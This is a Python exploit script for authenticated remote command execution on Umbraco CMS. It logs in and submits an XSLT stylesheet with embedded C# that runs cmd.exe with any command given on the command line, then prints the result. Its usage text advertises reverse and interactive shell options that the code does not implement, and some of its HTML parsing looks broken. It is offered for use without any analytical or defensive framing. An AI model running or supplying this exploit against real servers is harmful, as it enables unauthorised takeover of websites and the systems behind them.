#!/usr/bin/python3
import os
import sys
import requests
from bs4 import BeautifulSoup


def exploit(target, cmd):
    # Log-in
    username = input("Enter the username: ")
    password = input("Enter your password: ")
    targetsession = requests.session()
    targetsession.post(f"{target}/umbraco/backoffice/UmbracoApi/Authentication/PostLogin",json={"username": username, "password": password})
    # Go to vulnerable web page
    xlst_page = targetsession.get(f"{target}/umbraco/developer/Xslt/xsltVisualize.aspx")
    soup = BeautifulSoup(xlst_page.text, 'html.parser')
    payload = ''.join(["""<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = """,
               f'"{cmd}";',
               """ System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>\\"""])
    data = { "__EVENTTARGET": "", "__EVENTARGUMENT": "", "__VIEWSTATE": soup.find(id="__VIEWSTATE").contents['value'],
        "__VIEWSTATEGENERATOR": soup.find(id="__VIEWSTATEGENERATOR").contents['value'],
        "ctl00$body$xsltSelection": payload,
        "ctl00$body$contentPicker$ContentIdValue": "",
        "ctl00$body$visualizeDo": "Visualize+XSLT" }
    # Exploit
    exploit_rsp = targetsession.post(f"{target}/umbraco/developer/Xslt/xsltVisualize.aspx",
                            data=data,
                            headers={'UMB-XSRF-TOKEN': targetsession.cookies['UMB-XSRF-TOKEN']})
    soup = BeautifulSoup(exploit_rsp.text, 'html.parser')
    print(soup.find(id="result").contents[0])

def main(target, cmd):
    exploit(target, cmd)


if __name__ == "__main__":
    try:
        main(sys.argv[1], sys.argv[2])
    except IndexError:
        print(f"Usage: {sys.argv[0]} http://target.url/ona/ <cmd>")
        print(f"Enter rshell as the command for a reverse shell.\nEnter ishell for interactive.")
